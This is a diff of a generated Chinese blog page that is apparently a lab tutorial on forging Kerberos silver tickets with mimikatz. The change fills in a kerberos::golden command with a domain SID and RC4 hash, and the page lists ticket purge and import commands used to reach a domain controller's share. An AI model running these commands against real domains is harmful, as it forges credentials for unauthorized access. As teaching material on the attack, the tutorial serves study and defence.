@@ -65,7 +65,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">570字</span>
+            <span class="post-count">578字</span>
         </span>
     </span>
 
@@ -123,7 +123,7 @@
 <h4 id="2-伪造票据"><a href="#2-伪造票据" class="headerlink" title="2. 伪造票据"></a>2. 伪造票据</h4><h5 id="在-yuming域下的设备（Windows-7）上操作："><a href="#在-yuming域下的设备（Windows-7）上操作：" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><p>得到服务账号的 HASH 之后使用mimikatz中的 kerberos::golden功能生成白银票据TGS ticket。</p>
 <h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><p>/domain:当前域名称<br>/sid:SID 值，域的SID<br>/target:目标主机<br>/rc4:目标主机的 HASH值<br>/server:需要获取权限的服务<br>/user:伪造的用户名<br>/ptt:表示的是Pass The Ticket 攻击，是把生成的票据导入内存，也可以使用 /ticket 导出之后再使用 kerberos::ptt 导入。</p>
 <h5 id="常见的service："><a href="#常见的service：" class="headerlink" title="常见的service："></a>常见的service：</h5><p><img src="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-2-1.png" alt></p>
-<h5 id="这里的service使用的是-cifs-服务："><a href="#这里的service使用的是-cifs-服务：" class="headerlink" title="这里的service使用的是 cifs 服务："></a>这里的service使用的是 cifs 服务：</h5><p>kerberos::golden /domain:test.com /sid: /target:计算机名称.test.com /rc4: /service:cifs /user:administrator /ptt<br><img src="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-2-2.png" alt></p>
+<h5 id="这里的service使用的是-cifs-服务："><a href="#这里的service使用的是-cifs-服务：" class="headerlink" title="这里的service使用的是 cifs 服务："></a>这里的service使用的是 cifs 服务：</h5><p>kerberos::golden /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /target:计算机名称.test.com /rc4:68d728ba8b578294832fb6247c912f94 /service:cifs /user:administrator /ptt<br><img src="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-2-2.png" alt></p>
 <h4 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h4><h5 id="在-yuming域下的设备（Windows-7）上操作：-1"><a href="#在-yuming域下的设备（Windows-7）上操作：-1" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><p>清空本地票据缓存，导入伪造的票据（如果用的/ptt参数就跳过这一步，只需要清理本地缓存）<br>查看本地保存的票据：kerberos::list<br>清理本地票据缓存：kerberos::purge<br>导入伪造的白银票据：kerberos::ptt silver.kiribi （步骤2使用了 /ptt ，所以此步忽略）<br>查看tgt票据（只能看到存在的黄金票据）：kerberos::tgt<br>票据20分钟内有效，过期之后可以再次导入<br><img src="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-3-1.png" alt><br><img src="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-3-2.png" alt><br><img src="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-3-3.png" alt></p>
 <h4 id="4-利用伪造的白银票据"><a href="#4-利用伪造的白银票据" class="headerlink" title="4. 利用伪造的白银票据"></a>4. 利用伪造的白银票据</h4><h5 id="在-yuming域下的设备（Windows-7）上操作：-2"><a href="#在-yuming域下的设备（Windows-7）上操作：-2" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><ol>
 <li>访问域控的共享目录<br><img src="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-4-1.png" alt></li>
@@ -135,7 +135,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" data-id="ck6kfadgk000bpcwrcpbw4mnq"
+      <a data-url="http://yoursite.com/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" data-id="ck6kkw5h5000b64wrf1j2dbsj"
         class="article-share-link">Share</a>
       
     </footer>
